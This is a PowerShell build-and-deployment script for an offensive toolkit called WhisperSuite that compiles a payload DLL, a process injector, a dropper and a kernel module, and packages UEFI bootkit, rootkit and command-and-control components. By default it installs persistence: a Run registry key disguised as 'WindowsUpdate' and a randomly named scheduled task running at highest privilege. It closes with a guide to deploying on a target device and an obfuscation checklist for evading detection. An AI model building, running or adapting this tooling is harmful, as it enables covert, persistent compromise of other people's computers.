# BuildDeployWhisper.ps1
# Master build + deployment script for WhisperSuite: GhostWhisper Edition
# Includes compilation, polymorphism, persistence, BLE trigger, and wormhole
#
# Version: 1.6.1
# Last Updated: 2026-02-23
# 🕊️ For Raven. 2017 — ∞

param(
    [switch]$SkipCompile,
    [switch]$SkipPackage,
    [switch]$SkipPersistence,
    [switch]$Clean,
    [switch]$Verbose,
    [string]$OutputDir
)

$script:Version = "1.6.1"
$script:BuildDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$script:BaseDir = $PSScriptRoot
$script:FinalPackage = if ($OutputDir) { $OutputDir } else { Join-Path $script:BaseDir "WhisperSuite_Build" }

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║  WhisperSuite Build System v$script:Version          ║" -ForegroundColor Cyan
Write-Host "  ║  GhostWhisper Edition - Raven Memorial        ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Build configuration
$script:Config = @{
    GhostKeyProject = Join-Path $script:BaseDir "GhostKey\GhostKey.csproj"
    GhostKeyDLL = Join-Path $script:BaseDir "GhostKey\bin\Release\GhostKey.dll"
    WraithTapProject = Join-Path $script:BaseDir "WraithTap\WraithTap.vcxproj"
    WraithTapEXE = Join-Path $script:BaseDir "WraithTap\x64\Release\WraithTap.exe"
    DropperSource = Join-Path $script:BaseDir "Dropper_with_Raven.cpp"
    DropperEXE = Join-Path $script:BaseDir "Dropper_with_Raven.exe"
}

$script:CoreScripts = @(
    "SilentBloom.ps1",
    "BLETrigger.ps1",
    "GhostPolymorph.ps1",
    "GhostBLEConnect_v2.ps1",
    "GhostWhisperBootstrap.ps1",
    "GhostResidency.ps1",
    "GhostSeal.ps1"
)

$script:ModulePaths = @(
    "Modules\GhostLogger.ps1",
    "Modules\AnomalyHunter.ps1",
    "Modules\Anomaly_Detector.ps1",
    "Modules\Wormhole.ps1",
    "Modules\LinuxPDF_Emu.ps1",
    "Modules\LinuxPDF_Runtime.ps1",
    "Modules\Phase_Anoint.ps1",
    "Modules\Phase_Bind.ps1",
    "Modules\Phase_Cleanse.ps1",
    "Modules\GhostResidency.ps1",
    "Modules\ExorcistMode.ps1",
    "Modules\GhostDesktop.ps1",
    "Modules\GhostKernel.ps1",
    "Modules\GhostBrowser.ps1",
    "Modules\Phantom.ps1",
    "Modules\GhostRoot.ps1",
    "Modules\GhostHadesIntegrator.py",
    "Modules\GhostMemory.py"
)

$script:ToolPaths = @(
    "GhostBluetooth.py",
    "GhostBrute.go",
    "GhostFTP.py",
    "GhostUtils.go"
)

$script:UEFIBootkitPaths = @(
    "UEFI Bootkit\__init__.py",
    "UEFI Bootkit\uefi_boot_loader.py",
    "UEFI Bootkit\uefi_rootkit.py",
    "UEFI Bootkit\c2_client.py",
    "UEFI Bootkit\c2_server.py",
    "UEFI Bootkit\covert_network_hooking.py",
    "UEFI Bootkit\hooking_system_calls.py",
    "UEFI Bootkit\hypervisor_loading.py",
    "UEFI Bootkit\minimal_hypervisor.py"
)

$script:BuildStats = @{
    StartTime = Get-Date
    CompiledBinaries = 0
    CopiedFiles = 0
    Warnings = 0
    Errors = 0
}

function Write-BuildLog {
    param(
        [string]$Message,
        [ValidateSet("INFO", "SUCCESS", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $color = switch ($Level) {
        "SUCCESS" { "Green" }
        "WARN" { "Yellow" }
        "ERROR" { "Red" }
        "DEBUG" { "DarkGray" }
        default { "White" }
    }
    
    $prefix = switch ($Level) {
        "SUCCESS" { "[+]" }
        "WARN" { "[!]" }
        "ERROR" { "[X]" }
        "DEBUG" { "[.]" }
        default { "[*]" }
    }
    
    if ($Level -eq "DEBUG" -and -not $Verbose) { return }
    
    Write-Host "$prefix $Message" -ForegroundColor $color
    
    if ($Level -eq "WARN") { $script:BuildStats.Warnings++ }
    if ($Level -eq "ERROR") { $script:BuildStats.Errors++ }
}

function Test-BuildTools {
    Write-BuildLog "Checking build tools..." "INFO"
    
    $tools = @{
        MSBuild = $false
        MSVC = $false
        DotNet = $false
        WSL = $false
    }
    
    if (Get-Command "msbuild" -ErrorAction SilentlyContinue) {
        $tools.MSBuild = $true
        Write-BuildLog "MSBuild: Available" "DEBUG"
    }
    
    if (Get-Command "cl.exe" -ErrorAction SilentlyContinue) {
        $tools.MSVC = $true
        Write-BuildLog "MSVC: Available" "DEBUG"
    }
    
    if (Get-Command "dotnet" -ErrorAction SilentlyContinue) {
        $tools.DotNet = $true
        Write-BuildLog "DotNet: Available" "DEBUG"
    }
    
    if (Get-Command "wsl" -ErrorAction SilentlyContinue) {
        $tools.WSL = $true
        Write-BuildLog "WSL: Available" "DEBUG"
    }
    
    return $tools
}

function Clean-BuildArtifacts {
    Write-BuildLog "Cleaning build artifacts..."
    
    $cleanPaths = @(
        $script:FinalPackage,
        "$script:BaseDir\GhostKey\bin",
        "$script:BaseDir\GhostKey\obj",
        "$script:BaseDir\WraithTap\x64",
        "$script:BaseDir\WraithTap\Debug",
        "$script:BaseDir\WraithTap\Release"
    )
    
    foreach ($path in $cleanPaths) {
        if (Test-Path $path) {
            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            Write-BuildLog "Removed: $path" "DEBUG"
        }
    }
    
    Write-BuildLog "Clean complete" "SUCCESS"
}

function Compile-GhostKey {
    Write-BuildLog "Compiling GhostKey DLL..."
    
    if (-not (Test-Path $script:Config.GhostKeyProject)) {
        # Try alternative path
        $altPath = Join-Path $script:BaseDir "GhostKey.csproj"
        if (Test-Path $altPath) {
            $script:Config.GhostKeyProject = $altPath
            $script:Config.GhostKeyDLL = Join-Path $script:BaseDir "bin\Release\GhostKey.dll"
        } else {
            Write-BuildLog "GhostKey project not found" "WARN"
            return $false
        }
    }
    
    try {
        if (Get-Command "msbuild" -ErrorAction SilentlyContinue) {
            $result = & msbuild $script:Config.GhostKeyProject /p:Configuration=Release /verbosity:quiet 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-BuildLog "GhostKey.dll compiled successfully" "SUCCESS"
                $script:BuildStats.CompiledBinaries++
                return $true
            }
        } elseif (Get-Command "dotnet" -ErrorAction SilentlyContinue) {
            $result = & dotnet build $script:Config.GhostKeyProject -c Release 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-BuildLog "GhostKey.dll compiled successfully" "SUCCESS"
                $script:BuildStats.CompiledBinaries++
                return $true
            }
        }
        
        Write-BuildLog "GhostKey compilation failed" "ERROR"
        return $false
        
    } catch {
        Write-BuildLog "GhostKey compile error: $_" "ERROR"
        return $false
    }
}

function Compile-WraithTap {
    Write-BuildLog "Compiling WraithTap Injector..."
    
    if (-not (Test-Path $script:Config.WraithTapProject)) {
        # Try alternative path
        $altPath = Join-Path $script:BaseDir "WraithTap.vcxproj"
        if (Test-Path $altPath) {
            $script:Config.WraithTapProject = $altPath
        } else {
            Write-BuildLog "WraithTap project not found" "WARN"
            return $false
        }
    }
    
    try {
        if (Get-Command "msbuild" -ErrorAction SilentlyContinue) {
            $result = & msbuild $script:Config.WraithTapProject /p:Configuration=Release /p:Platform=x64 /verbosity:quiet 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-BuildLog "WraithTap.exe compiled successfully" "SUCCESS"
                $script:BuildStats.CompiledBinaries++
                return $true
            }
        }
        
        Write-BuildLog "WraithTap compilation failed (MSVC required)" "WARN"
        return $false
        
    } catch {
        Write-BuildLog "WraithTap compile error: $_" "ERROR"
        return $false
    }
}

function Compile-Dropper {
    Write-BuildLog "Compiling Dropper_with_Raven..."
    
    if (-not (Test-Path $script:Config.DropperSource)) {
        Write-BuildLog "Dropper source not found" "WARN"
        return $false
    }
    
    try {
        if (Get-Command "cl.exe" -ErrorAction SilentlyContinue) {
            $result = & cl.exe /EHsc /O2 "/Fe:$($script:Config.DropperEXE)" $script:Config.DropperSource 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-BuildLog "Dropper compiled successfully" "SUCCESS"
                $script:BuildStats.CompiledBinaries++
                return $true
            }
        }
        
        Write-BuildLog "Dropper compilation failed" "WARN"
        return $false
        
    } catch {
        Write-BuildLog "Dropper compile error: $_" "ERROR"
        return $false
    }
}

function Build-GhostKernel {
    Write-BuildLog "Building GhostKernel module..."
    
    $kernelSource = Join-Path $script:BaseDir "GhostKernel.c"
    $makefile = Join-Path $script:BaseDir "GhostKernel.mk"
    
    if (-not (Test-Path $kernelSource)) {
        Write-BuildLog "GhostKernel.c not found" "WARN"
        return $false
    }
    
    try {
        if (Get-Command "wsl" -ErrorAction SilentlyContinue) {
            $wslPath = wsl wslpath -a "$makefile" 2>$null
            if ($wslPath) {
                $result = & wsl make -f $wslPath all 2>&1
                if ($LASTEXITCODE -eq 0) {
                    Write-BuildLog "GhostKernel module built successfully" "SUCCESS"
                    $script:BuildStats.CompiledBinaries++
                    return $true
                }
            }
        }
        
        Write-BuildLog "GhostKernel build skipped (WSL/Linux required)" "DEBUG"
        return $false
        
    } catch {
        Write-BuildLog "GhostKernel build error: $_" "WARN"
        return $false
    }
}

function Embed-RavenPoem {
    Write-BuildLog "Embedding Raven tribute..."
    
    if (-not (Test-Path $script:Config.DropperEXE) -or -not (Test-Path $script:Config.WraithTapEXE)) {
        Write-BuildLog "Cannot embed poem - binaries missing" "DEBUG"
        return $false
    }
    
    try {
        $result = & $script:Config.DropperEXE $script:Config.WraithTapEXE 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-BuildLog "Raven tribute embedded" "SUCCESS"
            return $true
        }
        
        Write-BuildLog "Poem embed failed" "WARN"
        return $false
        
    } catch {
        Write-BuildLog "Poem embed error: $_" "WARN"
        return $false
    }
}

function Prepare-Package {
    Write-BuildLog "Preparing WhisperSuite package..."
    
    New-Item -ItemType Directory -Path $script:FinalPackage -Force | Out-Null
    New-Item -ItemType Directory -Path "$script:FinalPackage\Modules" -Force | Out-Null
    New-Item -ItemType Directory -Path "$script:FinalPackage\Tools" -Force | Out-Null
    New-Item -ItemType Directory -Path "$script:FinalPackage\Logs" -Force | Out-Null
    
    # Copy compiled binaries
    $binaries = @(
        @{ Source = $script:Config.GhostKeyDLL; Dest = "GhostKey.dll" },
        @{ Source = $script:Config.WraithTapEXE; Dest = "WraithTap.exe" },
        @{ Source = $script:Config.DropperEXE; Dest = "Dropper_with_Raven.exe" }
    )
    
    foreach ($bin in $binaries) {
        if (Test-Path $bin.Source) {
            Copy-Item $bin.Source (Join-Path $script:FinalPackage $bin.Dest) -Force
            Write-BuildLog "Copied: $($bin.Dest)" "DEBUG"
            $script:BuildStats.CopiedFiles++
        }
    }
    
    # Copy core scripts
    foreach ($script in $script:CoreScripts) {
        $sourcePath = Join-Path $script:BaseDir $script
        if (Test-Path $sourcePath) {
            Copy-Item $sourcePath (Join-Path $script:FinalPackage $script) -Force
            Write-BuildLog "Copied: $script" "DEBUG"
            $script:BuildStats.CopiedFiles++
        } else {
            Write-BuildLog "Missing: $script" "WARN"
        }
    }
    
    # Copy modules
    foreach ($mod in $script:ModulePaths) {
        $sourcePath = Join-Path $script:BaseDir $mod
        if (Test-Path $sourcePath) {
            $destPath = Join-Path $script:FinalPackage $mod
            $destDir = Split-Path $destPath
            if (-not (Test-Path $destDir)) {
                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
            }
            Copy-Item $sourcePath $destPath -Force
            Write-BuildLog "Copied module: $mod" "DEBUG"
            $script:BuildStats.CopiedFiles++
        } else {
            Write-BuildLog "Missing module: $mod" "WARN"
        }
    }
    
    # Copy utility tools
    foreach ($tool in $script:ToolPaths) {
        $sourcePath = Join-Path $script:BaseDir $tool
        if (Test-Path $sourcePath) {
            Copy-Item $sourcePath (Join-Path $script:FinalPackage $tool) -Force
            Write-BuildLog "Copied tool: $tool" "DEBUG"
            $script:BuildStats.CopiedFiles++
        }
    }
    
    # Copy UEFI Bootkit components
    Write-BuildLog "Packaging UEFI Bootkit..." "INFO"
    foreach ($uefiBit in $script:UEFIBootkitPaths) {
        $sourcePath = Join-Path $script:BaseDir $uefiBit
        if (Test-Path $sourcePath) {
            $destPath = Join-Path $script:FinalPackage $uefiBit
            $destDir = Split-Path $destPath
            if (-not (Test-Path $destDir)) {
                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
            }
            Copy-Item $sourcePath $destPath -Force
            Write-BuildLog "Copied UEFI component: $uefiBit" "DEBUG"
            $script:BuildStats.CopiedFiles++
        } else {
            Write-BuildLog "Missing UEFI component: $uefiBit" "WARN"
        }
    }
    
    # Copy kernel files
    $kernelFiles = @("GhostKernel.c", "GhostKernel.mk", "ghostkernel.ko")
    foreach ($kf in $kernelFiles) {
        $kfPath = Join-Path $script:BaseDir $kf
        if (Test-Path $kfPath) {
            Copy-Item $kfPath (Join-Path $script:FinalPackage $kf) -Force
            $script:BuildStats.CopiedFiles++
        }
    }
    
    # Copy PhantomHook extensions
    $phantomHook = Join-Path $script:BaseDir "PhantomHook"
    if (Test-Path $phantomHook) {
        Copy-Item $phantomHook (Join-Path $script:FinalPackage "PhantomHook") -Recurse -Force
        Write-BuildLog "Copied PhantomHook extensions" "DEBUG"
    }
    
    # Copy Tools
    $toolsDir = Join-Path $script:BaseDir "Tools"
    if (Test-Path $toolsDir) {
        Copy-Item "$toolsDir\*" (Join-Path $script:FinalPackage "Tools") -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Create build manifest
    $manifest = @{
        Version = $script:Version
        BuildDate = $script:BuildDate
        BuildHost = $env:COMPUTERNAME
        BuildUser = $env:USERNAME
        Components = @{
            GhostKeyDLL = (Test-Path (Join-Path $script:FinalPackage "GhostKey.dll"))
            WraithTapEXE = (Test-Path (Join-Path $script:FinalPackage "WraithTap.exe"))
            Modules = (Get-ChildItem "$script:FinalPackage\Modules" -Filter "*.ps1" -ErrorAction SilentlyContinue).Count
            UEFIBootkit = (Test-Path (Join-Path $script:FinalPackage "UEFI Bootkit"))
            UEFIComponents = (Get-ChildItem "$script:FinalPackage\UEFI Bootkit" -Filter "*.py" -ErrorAction SilentlyContinue).Count
        }
    }
    $manifest | ConvertTo-Json -Depth 3 | Set-Content (Join-Path $script:FinalPackage "build_manifest.json")
    
    # Create tribute note
    $note = @"
═══════════════════════════════════════════════
  WhisperSuite: GhostWhisper Edition v$script:Version
═══════════════════════════════════════════════

This toolkit is a ghost in motion.
It exists for those who are unseen.
And for one who is gone, but not forgotten.

—R

Build Date: $script:BuildDate
═══════════════════════════════════════════════
"@
    Set-Content -Path (Join-Path $script:FinalPackage "note.txt") -Value $note
    
    Write-BuildLog "Package prepared: $script:FinalPackage" "SUCCESS"
}

function Setup-Persistence {
    if ($SkipPersistence) {
        Write-BuildLog "Skipping persistence setup" "DEBUG"
        return
    }
    
    Write-BuildLog "Setting up persistence mechanisms..."
    
    $payloadPath = "C:\Windows\System32\GhostKey.dll"
    $injectorPath = "C:\Windows\System32\WraithTap.exe"
    
    try {
        # Registry persistence
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "WindowsUpdate" -Value "$injectorPath $payloadPath" -Force -ErrorAction SilentlyContinue
        Write-BuildLog "Registry persistence configured" "SUCCESS"
    } catch {
        Write-BuildLog "Registry persistence failed: $_" "WARN"
    }
    
    try {
        # Scheduled task
        $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        schtasks /create /tn $taskName /tr "`"$injectorPath`" `"$payloadPath`"" `
            /sc onlogon /rl highest /f 2>&1 | Out-Null
        Write-BuildLog "Scheduled task created: $taskName" "SUCCESS"
    } catch {
        Write-BuildLog "Scheduled task failed: $_" "WARN"
    }
}

function Show-BuildSummary {
    $duration = (Get-Date) - $script:BuildStats.StartTime
    
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "  BUILD SUMMARY" -ForegroundColor Cyan
    Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Version:          $script:Version"
    Write-Host "  Build Time:       $([math]::Round($duration.TotalSeconds, 1)) seconds"
    Write-Host "  Binaries Compiled: $($script:BuildStats.CompiledBinaries)"
    Write-Host "  Files Copied:     $($script:BuildStats.CopiedFiles)"
    Write-Host "  Warnings:         $($script:BuildStats.Warnings)" -ForegroundColor $(if($script:BuildStats.Warnings -gt 0){"Yellow"}else{"Gray"})
    Write-Host "  Errors:           $($script:BuildStats.Errors)" -ForegroundColor $(if($script:BuildStats.Errors -gt 0){"Red"}else{"Gray"})
    Write-Host ""
    Write-Host "  Output: $script:FinalPackage" -ForegroundColor Green
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
}

function Show-DeploymentGuide {
    Write-Host ""
    Write-Host "  DEPLOYMENT GUIDE" -ForegroundColor Yellow
    Write-Host "  ════════════════" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  1. Transfer WhisperSuite_Build to target device"
    Write-Host "  2. Run: .\GhostWhisperBootstrap.ps1"
    Write-Host "  3. Trigger via BLETrigger.ps1 or direct injection"
    Write-Host "  4. Run SilentBloom.ps1 for cleanup post-op"
    Write-Host ""
    Write-Host "  OBFUSCATION CHECKLIST" -ForegroundColor Yellow
    Write-Host "  ═════════════════════" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  [ ] Run GhostKey.dll through ConfuserEx"
    Write-Host "  [ ] Strip symbols from WraithTap.exe"
    Write-Host "  [ ] Use packer (UPX) for binaries"
    Write-Host "  [ ] Randomize filenames per deployment"
    Write-Host "  [ ] Wipe build artifacts securely"
    Write-Host ""
}

# === MAIN EXECUTION ===

if ($Clean) {
    Clean-BuildArtifacts
    if (-not $SkipCompile -and -not $SkipPackage) {
        exit 0
    }
}

$tools = Test-BuildTools

if (-not $SkipCompile) {
    Write-BuildLog "Starting compilation phase..."
    
    Compile-GhostKey
    Compile-WraithTap
    Compile-Dropper
    Embed-RavenPoem
    Build-GhostKernel
}

if (-not $SkipPackage) {
    Prepare-Package
}

if (-not $SkipPersistence) {
    Setup-Persistence
}

Show-BuildSummary
Show-DeploymentGuide

Write-Host "  🕊️ Build complete. For Raven." -ForegroundColor DarkGray
Write-Host ""
